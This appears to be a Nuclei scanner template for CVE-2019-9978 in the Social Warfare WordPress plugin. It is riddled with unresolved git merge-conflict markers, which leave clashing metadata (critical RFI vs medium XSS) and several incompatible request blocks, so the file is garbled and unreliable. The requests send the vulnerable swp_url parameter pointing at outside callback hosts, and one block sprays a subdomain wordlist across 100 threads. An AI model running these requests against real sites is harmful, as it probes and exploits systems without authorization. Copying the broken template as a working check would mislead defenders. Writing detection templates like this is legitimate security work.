id: CVE-2019-9978

info:
<<<<<<< HEAD
  name: WordPress social-warfare RFI
  author: madrobot,dwisiswant0
  severity: critical
  description: The social-warfare plugin before 3.5.3 for WordPress has stored XSS via the wp-admin/admin-post.php?swp_debug=load_options swp_url parameter, as exploited in the wild in March 2019. This affects Social Warfare and Social Warfare Pro.
  reference: https://github.com/mpgn/CVE-2019-9978
  tags: cve,cve2019,wordpress,wp-plugin,ssrf
<<<<<<< HEAD
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.10
    cve-id: CVE-2019-9978
    cwe-id: CWE-79
=======
  name: WordPress Social Warfare <3.5.3 - Cross-Site Scripting
  author: madrobot,dwisiswant0
  severity: medium
  description: WordPress Social Warfare plugin before 3.5.3 contains a cross-site scripting vulnerability via the wp-admin/admin-post.php?swp_debug=load_options swp_url parameter, affecting Social Warfare and Social Warfare Pro.
  reference:
    - https://github.com/mpgn/CVE-2019-9978
    - https://www.wordfence.com/blog/2019/03/unpatched-zero-day-vulnerability-in-social-warfare-plugin-exploited-in-the-wild/
    - https://www.pluginvulnerabilities.com/2019/03/21/full-disclosure-of-settings-change-persistent-cross-site-scripting-xss-vulnerability-in-social-warfare/
    - https://www.cybersecurity-help.cz/vdb/SB2019032105
    - https://nvd.nist.gov/vuln/detail/CVE-2019-9978
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-9978
    cwe-id: CWE-79
  tags: cve,cve2019,wordpress,wp-plugin,ssrf,kev
>>>>>>> 5d36d276 (add new stuff)

requests:
  - method: GET
    path:
<<<<<<< HEAD
      - "{{BaseURL}}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://burpcollaborator.net"
=======
      - "{{BaseURL}}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{{interactsh-url}}"

>>>>>>> 5d36d276 (add new stuff)
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
<<<<<<< HEAD
      - type: word
        words:
          - "Burp Collabolator Server"
        part: body
=======

      - type: word
        part: interactsh_protocol
        words:
          - "http"

# Enhanced by mp on 2022/08/31
>>>>>>> 5d36d276 (add new stuff)
=======

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{{Host}}.{{Port}}.{{Subdomains}}.2019.9978.{{MY-DOMAIN}} HTTP/1.1
        Host: {{Subdomains}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
>>>>>>> 18ddf72b (add new stuff)
